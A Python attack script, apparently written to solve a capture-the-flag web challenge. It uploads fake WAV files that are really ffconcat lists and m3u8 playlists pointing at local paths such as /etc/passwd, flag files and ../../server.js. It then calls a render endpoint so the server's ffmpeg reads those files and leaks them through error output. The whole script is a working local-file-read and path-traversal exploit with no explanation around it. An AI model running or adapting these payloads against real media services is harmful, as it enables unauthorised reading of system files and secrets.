#!/usr/bin/env python3
import io, json, urllib.request, urllib.error, http.cookiejar

BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent","Mozilla/5.0 studio")]

def do(path, data=None, headers=None, method=None):
    r = urllib.request.Request(BASE + path, data=data, method=method)
    for k, v in (headers or {}).items(): r.add_header(k, v)
    try:
        resp = op.open(r, timeout=90); return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()

def upload(content, fn="clip.wav"):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: audio/wav\r\n\r\n").encode())
    body.write(content); body.write(f"\r\n--{bd}--\r\n".encode())
    return do("/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")

def render(**kw):
    st,h,b=do("/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    try: return st, json.loads(b)
    except: return st, b.decode('utf-8','replace')

def trial(name, content):
    do("/studio")
    st,h,b = upload(content)
    ub = b.decode('utf-8','replace')
    accepted = st==200 and 'error' not in ub.lower()
    print(f"\n########## {name} ##########")
    print(f"upload status={st} accepted~={accepted} resp_snip={ub[:120]!r}")
    st,j = render(slug="p", theme="midnight")
    if isinstance(j,dict):
        print("render ok=",j.get("ok"), "outputs=", j.get("outputs"))
        err=j.get("errors") or ""
        if err: print("---- ffmpeg stderr ----\n"+err[-2200:])
    else:
        print("render raw:", str(j)[:300])

# 1. ffconcat with absolute path to candidate flag files
for p in ["/opt/app/flag.txt","/flag.txt","/flag","/opt/app/flag","/opt/app/.flag",
          "/etc/passwd","/etc/hostname"]:
    trial(f"ffconcat abs {p}", (f"ffconcat version 1.0\nfile '{p}'\n").encode())

# 2. ffconcat relative traversal (cwd=/opt/app/media/<ws>/)
for p in ["../../flag.txt","../../server.js","../../../etc/passwd"]:
    trial(f"ffconcat rel {p}", (f"ffconcat version 1.0\nfile '{p}'\n").encode())

# 3. m3u8 playlist pointing to local file
m3u = "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:1\n#EXTINF:1.0,\n{p}\n#EXT-X-ENDLIST\n"
for p in ["/opt/app/flag.txt","/etc/passwd"]:
    trial(f"m3u8 {p}", m3u.format(p=p).encode())

# 4. concat protocol style / raw
trial("plain text file", b"WEBVERSE test not audio\n")
print("\nDONE")
